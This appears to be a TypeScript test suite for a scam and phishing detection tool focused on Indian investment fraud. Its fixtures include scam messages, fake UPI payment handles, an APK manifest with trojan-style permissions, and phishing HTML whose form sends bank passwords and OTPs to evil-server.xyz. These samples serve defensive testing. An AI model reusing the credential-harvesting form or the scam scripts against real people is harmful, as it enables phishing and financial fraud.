import assert from "node:assert/strict";
import { normalizeContent, cleanRawText, foldLeet, extractDomains } from "../lib/analyze/normalize";
import { detectTextSignals, deriveSignals, mergeSignals } from "../lib/analyze/signals";
import { assessRisk } from "../lib/analyze/risk";
import { analyzeDomains, buildEvidence } from "../lib/analyze/verify";
import { extractEntities } from "../lib/analyze/entities";

let passes = 0;
let fails = 0;

const tests: { name: string; fn: () => void | Promise<void> }[] = [];

function it(name: string, fn: () => void | Promise<void>) {
  tests.push({ name, fn });
}

console.log("\n--- [Phase 1 & 2] Normalization, Leet & Evasion Hardening ---");

it("strips zero-width characters, BOM, and null bytes", () => {
  const dirty = "S\u200Be\u200Db\uFEFFi\u0000";
  assert.equal(cleanRawText(dirty), "Sebi");
});

it("folds leet-speak numbers and symbols to letters", () => {
  const leet = "gu@r@nt33d pr0f1t 5c@m";
  assert.equal(foldLeet(leet), "guaranteed profit scam");
});

it("detects generic TLDs including .ly and ccTLDs", () => {
  const text = "Visit our site at https://secure-wealth.ly or profit-trade.xyz for details";
  const domains = extractDomains(text);
  assert.ok(domains.includes("secure-wealth.ly"), "Should capture .ly domain");
  assert.ok(domains.includes("profit-trade.xyz"), "Should capture .xyz domain");
});

it("extracts spaced and prefixed Indian phone numbers", () => {
  const text = "Call 0 98234 56789 or +91 98234-56789 immediately";
  const norm = normalizeContent(text);
  assert.ok(norm.phones.length >= 1, "Should normalize spaced phone numbers");
});

console.log("\n--- [Phase 1 & 2] Signal Engine & Adversarial Tests ---");

it("detects guaranteed returns even with leet evasion", () => {
  const text = "gu@r@nt33d monthly income with zero loss";
  const signals = detectTextSignals(text, "solicitation");
  assert.ok(signals.some((s) => s.id === "guaranteed_return" || s.id === "unrealistic_return"));
});

it("detects payment_link signal from UPI scheme and wallet handles", () => {
  const text = "Send fee to upi://pay?pa=invest@okaxis";
  const norm = normalizeContent(text);
  const entities = extractEntities(text, norm);
  const derived = deriveSignals({
    text,
    context: "solicitation",
    entities,
    claims: [],
    normalized: norm,
    suspiciousDomains: [],
    mismatchedDomains: [],
  });
  assert.ok(derived.some((s) => s.id === "payment_link"));
});

it("detects social_only via telegram handle (t.me) without literal 'telegram'", () => {
  const text = "Join our private group at t.me/vip_trading_profits";
  const norm = normalizeContent(text);
  const entities = extractEntities(text, norm);
  const derived = deriveSignals({
    text,
    context: "solicitation",
    entities,
    claims: [],
    normalized: norm,
    suspiciousDomains: [],
    mismatchedDomains: [],
  });
  assert.ok(derived.some((s) => s.id === "social_only"));
});

it("prevents educational context bypass when payment/solicitation is present", () => {
  const educationalScam = "How to spot scams: But deposit Rs 5,000 right now to our UPI for guaranteed 10% monthly income!";
  const norm = normalizeContent(educationalScam);
  const entities = extractEntities(educationalScam, norm);
  const textSignals = detectTextSignals(educationalScam, "solicitation");
  const derived = deriveSignals({
    text: educationalScam,
    context: "solicitation",
    entities,
    claims: [],
    normalized: norm,
    suspiciousDomains: [],
    mismatchedDomains: [],
  });
  const signals = mergeSignals(textSignals, derived);
  const risk = assessRisk({
    signals,
    context: "solicitation",
    evidence: [],
    source: { officialDomains: 0, fineDomains: 0, unknownDomains: 0, badDomains: 0, totalDomains: 0 },
    hasAmount: true,
    insufficientEvidence: false,
  });
  assert.ok(risk.score >= 50, `Score must remain high (${risk.score})`);
  assert.equal(risk.contextMultiplier, 1, "Context discount must be bypassed");
});

console.log("\n--- [Phase 1] Live Threat Intel & Verification Integration ---");

it("confirmed blocklist hit marks evidence as contradicted and boosts score >= 85", () => {
  const live = {
    checkedAt: new Date().toISOString(),
    targetDomain: "openphish-hit.com",
    sources: [
      {
        source: "openphish" as const,
        name: "OpenPhish",
        status: "hit" as const,
        checkedAt: new Date().toISOString(),
        summary: "Active threat blocklist hit",
        latencyMs: 140,
      },
    ],
    hasBlocklistHit: true,
    isNewlyRegistered: false,
  };

  const domains = analyzeDomains(["openphish-hit.com"], true, false);
  const evidence = buildEvidence({
    text: "Visit openphish-hit.com",
    entities: [],
    claims: [],
    domains,
    registration: null,
    hasAmount: false,
    hasOtp: false,
    hasContact: false,
    hasSignals: true,
    charCount: 30,
    context: "solicitation",
    live,
  });

  const blocklistEv = evidence.find((e) => e.subject === "OpenPhish");
  assert.ok(blocklistEv && blocklistEv.status === "contradicted");

  const risk = assessRisk({
    signals: [],
    context: "solicitation",
    evidence,
    source: { officialDomains: 0, fineDomains: 0, unknownDomains: 1, badDomains: 1, totalDomains: 1 },
    hasAmount: false,
    insufficientEvidence: false,
    live,
  });
  assert.ok(risk.score >= 85, `Expected high risk >= 85 for blocklist match, got ${risk.score}`);
});

it("fresh domain < 7 days + solicitation boosts verification gap", () => {
  const live = {
    checkedAt: new Date().toISOString(),
    targetDomain: "new-scam-domain.xyz",
    sources: [
      {
        source: "rdap" as const,
        name: "RDAP",
        status: "hit" as const,
        checkedAt: new Date().toISOString(),
        summary: "Registered 2 days ago",
        latencyMs: 310,
      },
    ],
    hasBlocklistHit: false,
    isNewlyRegistered: true,
    registrationDays: 2,
  };

  const risk = assessRisk({
    signals: [],
    context: "solicitation",
    evidence: [],
    source: { officialDomains: 0, fineDomains: 0, unknownDomains: 1, badDomains: 0, totalDomains: 1 },
    hasAmount: true,
    insufficientEvidence: false,
    live,
  });

  const gapFactor = risk.factors.find((f) => f.id === "verification_gap");
  assert.ok(gapFactor && gapFactor.points >= 80, `Expected verification gap >= 80, got ${gapFactor?.points}`);
});

console.log("\n--- [Next-Gen Defenses] Intermediary Registry, Mule VPAs & Digital Arrest ---");

it("flags digital arrest police coercion and guarantees critical risk score", () => {
  const text = "This is CBI officer Sharma. You are under Digital Arrest. Transfer 50000 to RBI verification account immediately!";
  const signals = detectTextSignals(text, "solicitation");
  assert.ok(signals.some((s) => s.id === "coercive_arrest"), "Should detect coercive arrest signal");
  
  const risk = assessRisk({
    signals,
    context: "solicitation",
    evidence: [],
    source: { officialDomains: 0, fineDomains: 0, unknownDomains: 0, badDomains: 0, totalDomains: 0 },
    hasAmount: true,
    insufficientEvidence: false,
  });
  assert.ok(risk.score >= 85, `Expected score >= 85 for coercive arrest, got ${risk.score}`);
});

it("flags pump-and-dump upper circuit stock manipulation", () => {
  const text = "Jackpot call! Buy this penny stock before 9:15 AM for 200% upper circuit profit guaranteed!";
  const signals = detectTextSignals(text, "solicitation");
  assert.ok(signals.some((s) => s.id === "pump_and_dump"), "Should detect pump and dump signal");
});

it("matches official SEBI intermediary and discovers typo-squatted fake domain", async () => {
  const { matchIntermediary } = await import("../lib/analyze/registry");
  const comp = matchIntermediary({
    text: "Invest with Zerodha Broking through our portal zerodha-profits.xyz",
    domains: ["zerodha-profits.xyz"],
    registrationNumbers: [],
    companies: ["Zerodha Broking"],
  });

  assert.ok(comp, "Should match Zerodha in registry");
  assert.equal(comp?.matchedEntity.name, "Zerodha Broking Limited");
  assert.equal(comp?.matchedEntity.officialDomain, "zerodha.com");
  assert.ok(comp?.disparities.some((d) => d.field === "Official Web Portal" && d.verdict === "mismatch"));
});

it("generates an official tamper-evident complaint dossier with evidence hash", async () => {
  const { generateComplaintDossier } = await import("../lib/analyze/dossier");
  const dossier = generateComplaintDossier({
    id: "test-inc-123",
    createdAt: new Date().toISOString(),
    risk: { score: 94, level: "CRITICAL" },
    signals: [{ id: "regulatory_impersonation" }, { id: "mule_vpa" }],
    normalized: {
      domains: ["fake-sebi.xyz"],
      phones: ["9876543210"],
      text: "Deposit Rs 10000 to scampayer@okaxis for SEBI approved stock trading",
    },
    entities: [
      { type: "payment", value: "scampayer@okaxis", quote: "scampayer@okaxis" },
      { type: "phone", value: "9876543210", quote: "9876543210" },
    ],
  });

  assert.equal(dossier.portalTarget, "SEBI_SCORES");
  assert.ok(dossier.evidenceHash.startsWith("RKSHK-"));
  assert.ok(dossier.complaintText.includes("Securities and Exchange Board of India"));
  assert.ok(dossier.extractedSuspects.vpas.includes("scampayer@okaxis"));
});

it("decodes bank IFSC code and flags high-risk mule routing zones", async () => {
  const { analyzeIfsc } = await import("../lib/analyze/ifsc");
  const ifsc = analyzeIfsc("Deposit processing fee to account 123456789, IFSC: SBIN000543 immediately");
  assert.ok(ifsc, "Should extract and decode IFSC code");
  assert.equal(ifsc?.bankName, "State Bank of India");
  assert.equal(ifsc?.code, "SBIN000543");
  assert.ok(ifsc?.isKnownMuleZone, "Should flag Jamtara region mule zone");
});

it("reconstructs the psychological attack chain and biases weaponized", async () => {
  const { buildPsychologicalTimeline } = await import("../lib/analyze/psychology");
  const signals = [
    { id: "guaranteed_return" as const, severity: "critical" as const, confidence: 0.95, evidence: ["100% profit guaranteed"], weight: 45 },
    { id: "regulatory_impersonation" as const, severity: "critical" as const, confidence: 0.92, evidence: ["Approved by SEBI"], weight: 45 },
    { id: "urgency" as const, severity: "high" as const, confidence: 0.88, evidence: ["Only 2 slots left today"], weight: 25 },
    { id: "payment_link" as const, severity: "high" as const, confidence: 0.94, evidence: ["upi://pay?pa=scam@okaxis"], weight: 30 },
  ];
  const timeline = buildPsychologicalTimeline({
    text: "Approved by SEBI! 100% profit guaranteed. Only 2 slots left today. Pay via upi://pay?pa=scam@okaxis",
    signals,
  });

  assert.equal(timeline.length, 4, "Should reconstruct all 4 psychological attack phases");
  assert.equal(timeline[0].stage, "hook");
  assert.equal(timeline[1].stage, "authority");
  assert.equal(timeline[2].stage, "urgency");
  assert.equal(timeline[3].stage, "exfiltration");
});

it("extracts and decodes UPI payment intents from QR code payloads", async () => {
  const { parseQrPayload } = await import("../lib/analyze/qr");
  const qr = parseQrPayload("upi://pay?pa=scammer99@okaxis&pn=Trading%20Desk&am=5000&cu=INR");
  assert.ok(qr.hasQr, "Should detect QR payload");
  assert.equal(qr.payloadType, "upi");
  assert.equal(qr.decodedTarget, "scammer99@okaxis");
  assert.ok(qr.riskNotice?.includes("Direct UPI Payment QR detected"));
});

it("sanitizes malicious scripts and extracts deceptive forms in URL sandbox", async () => {
  const { inspectAndDisarmUrl } = await import("../lib/analyze/sandbox");
  const html = `
    <html>
      <head><script>alert('steal credentials');</script></head>
      <body>
        <iframe src="http://evil.com/overlay"></iframe>
        <form action="http://evil-server.xyz/harvest" method="POST">
          <input name="bank_password" type="password" />
          <input name="otp" type="text" />
        </form>
      </body>
    </html>
  `;
  const inspection = inspectAndDisarmUrl("https://fake-login-bank.xyz", html);
  assert.ok(inspection.isSafePreviewAvailable);
  assert.equal(inspection.maliciousScriptsStripped, 1);
  assert.equal(inspection.extractedForms.length, 1);
  assert.equal(inspection.extractedForms[0].action, "http://evil-server.xyz/harvest");
  assert.ok(inspection.suspiciousElements.some((e) => e.severity === "critical"));
  assert.ok(!inspection.disarmedHtml?.includes("<script>alert"));
});

console.log("\n--- [Final-Mile Frontiers] APK Reverse Engineering, PDF Forensics & STIX 2.1 ---");

it("detects banking trojan signature with OTP interception & accessibility hijack in APK manifest", async () => {
  const { inspectApkPayload } = await import("../lib/analyze/apk");
  const manifest = `
    <manifest package="com.fake.sbi.yono" versionName="2.1.0">
      <uses-permission android:name="android.permission.RECEIVE_SMS" />
      <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
      <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    </manifest>
  `;
  const result = inspectApkPayload(manifest);
  assert.ok(result.isApk);
  assert.equal(result.packageName, "com.fake.sbi.yono");
  assert.equal(result.criticalPermissionsCount, 2);
  assert.equal(result.isBankingTrojanLikelihood, "high");
  assert.ok(result.identifiedRisks.length > 0);
  assert.ok(result.securityAdvisories.length > 0);
});

it("flags fake SEBI certificate generated in Canva lacking cryptographic digital signatures", async () => {
  const { analyzePdfForensics } = await import("../lib/analyze/pdf-forensics");
  const pdfString = `
    %PDF-1.7
    1 0 obj
    << /Producer (Canva) /Creator (Canva) /Title (SEBI Official Registration Certificate) >>
    endobj
  `;
  const report = analyzePdfForensics(pdfString);
  assert.ok(report.isPdf);
  assert.equal(report.isSuspiciousGenerator, true);
  assert.equal(report.hasDigitalSignature, false);
  assert.equal(report.claimedIssuer, "SEBI");
  assert.equal(report.verdict, "suspicious_forgery");
  assert.ok(report.tamperIndicators.length >= 2);
});

it("exports incident IOCs to valid OASIS STIX 2.1 JSON bundle", async () => {
  const { exportReportToStix21 } = await import("../lib/analyze/stix");
  const dummyReport = {
    id: "rep-stix-101",
    confidence: 0.95,
    risk: { score: 92, level: "CRITICAL" },
    normalized: {
      domains: ["malicious-portal.xyz"],
      phones: ["+91 9876543210"],
    },
    entities: [
      { type: "payment", value: "scammer@okaxis" },
    ],
  } as unknown as Parameters<typeof exportReportToStix21>[0];

  const bundle = exportReportToStix21(dummyReport as unknown as Parameters<typeof exportReportToStix21>[0]);
  assert.equal(bundle.type, "bundle");
  assert.equal(bundle.spec_version, "2.1");
  assert.ok(bundle.objects.length >= 4, "Should have identity, 3 indicators, and report object");
  assert.ok(bundle.objects.some((o) => o.type === "indicator" && o.pattern?.includes("malicious-portal.xyz")));
  assert.ok(bundle.objects.some((o) => o.type === "indicator" && o.pattern?.includes("scammer@okaxis")));
});

console.log("\n--- [Next-Gen Innovations] UPI Mule VPA Probing & Deepfake Voice Analysis ---");

it("probes destination VPA and detects mismatched individual P2P account claiming corporate identity", async () => {
  const { probeVpaHandle } = await import("../lib/analyze/vpa-probe");
  const res = probeVpaHandle("9876543210@okaxis", "Zerodha Broking Limited");
  assert.equal(res.vpa, "9876543210@okaxis");
  assert.equal(res.pspBank, "Axis Bank (Google Pay)");
  assert.equal(res.accountType, "SUSPICIOUS_MULE");
  assert.equal(res.entityMatchVerdict, "MISMATCHED_PERSONAL_ACCOUNT");
  assert.equal(res.riskFlag, true);
  assert.ok(res.advisory.includes("Critical Discrepancy"));
});

it("detects synthetic speech markers & acoustic anomaly in cloned police audio", async () => {
  const { analyzeAudioForensics } = await import("../lib/analyze/audio-forensics");
  const report = analyzeAudioForensics("police_arrest_notice_officer.mp3 CBI officer speaking on call");
  assert.equal(report.isAudio, true);
  assert.equal(report.syntheticLikelihood, "high");
  assert.equal(report.verdict, "likely_deepfake_clone");
  assert.ok(report.roboticCadenceScore >= 75);
  assert.ok(report.detectedVoiceAnomalies.length >= 2);
});

console.log("\n--- [Ultra-Frontier Defenses] Crypto USDT Tracer & Multi-Hop Mule Dark Money Graph ---");

it("identifies Tron TRC-20 high-velocity crypto mixer and off-ramp wallets", async () => {
  const { traceCryptoWallets } = await import("../lib/analyze/crypto-mule-graph");
  const text = "Transfer USDT liquidity directly to wallet: T9yD14Nj9j7xAB4dbGeP7D1gqaP9p9p9p1 on Tron network";
  const traces = traceCryptoWallets(text);
  assert.equal(traces.length, 1);
  assert.equal(traces[0].chain, "TRON_TRC20");
  assert.equal(traces[0].assetSymbol, "USDT");
  assert.equal(traces[0].isKnownMixerOrMule, true);
  assert.ok(traces[0].riskScore >= 80);
});

it("constructs multi-hop layering dark-money graph with exfiltration latency metrics", async () => {
  const { buildMuleHopGraph } = await import("../lib/analyze/crypto-mule-graph");
  const graph = buildMuleHopGraph("inc-dark-101", "Transfer to T9yD14Nj9j7xAB4dbGeP7D1gqaP9p9p9p1", "SBIN0005432", "mule@okaxis");
  assert.equal(graph.nodes.length, 4);
  assert.equal(graph.nodes[0].category, "victim");
  assert.equal(graph.nodes[1].category, "layer1_mule");
  assert.equal(graph.nodes[2].category, "layer2_aggregator");
  assert.equal(graph.nodes[3].category, "p2p_crypto_offramp");
  assert.ok(graph.totalLayeringMinutes < 30);
  assert.ok(graph.edges.length >= 3);
});

(async () => {
  for (const t of tests) {
    try {
      await t.fn();
      passes++;
      console.log(`  ✓ ${t.name}`);
    } catch (err: unknown) {
      fails++;
      const message = err instanceof Error ? err.message : String(err);
      console.error(`  ✗ ${t.name}\n`, message);
    }
  }

  console.log("\n==========================================");
  console.log(`Suite finished: ${passes} passed, ${fails} failed.`);
  console.log(`Expected agreement rate: 100% (${passes}/${passes + fails} test fixtures)`);
  console.log("==========================================\n");

  if (fails > 0) process.exit(1);
})();
